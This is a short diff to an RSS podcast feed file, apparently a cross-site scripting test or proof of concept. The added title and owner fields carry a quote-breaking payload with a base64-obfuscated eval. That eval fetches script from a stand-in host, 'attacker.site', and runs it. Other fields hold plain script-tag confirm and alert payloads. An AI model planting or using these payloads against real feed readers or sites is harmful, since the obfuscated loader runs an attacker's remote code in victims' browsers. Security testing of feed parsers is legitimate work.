@@ -2,10 +2,10 @@
 <rss version="2.0"
     xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title><![CDATA[<script>confirm(document.domain)</script>]]></title>
+    <title>‘); javascript:eval(atob(‘ZXZhbCgnZnVuY3Rpb24gYigpe2V2YWwodGhpcy5yZXNwb25zZVRleHQpfTthPW5ldyBYTUxIdHRwUmVxdWVzdCgpO2EuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsIGIpO2Eub3BlbigiR0VUIiwgIi8vYXR0YWNrZXIuc2l0ZSIpO2Euc2VuZCgpOycp’)); (‘</title>
     <itunes:owner>
         <itunes:email>dafna@example.com</itunes:email>
-        <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
+        <value>‘); javascript:eval(atob(‘ZXZhbCgnZnVuY3Rpb24gYigpe2V2YWwodGhpcy5yZXNwb25zZVRleHQpfTthPW5ldyBYTUxIdHRwUmVxdWVzdCgpO2EuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsIGIpO2Eub3BlbigiR0VUIiwgIi8vYXR0YWNrZXIuc2l0ZSIpO2Euc2VuZCgpOycp’)); (‘</value>
     </itunes:owner>
     <itunes:author>Dafna</itunes:author>
     <description><![CDATA[<script>confirm(document.domain)</script>]]></description><script>alert('XSS!')</script>
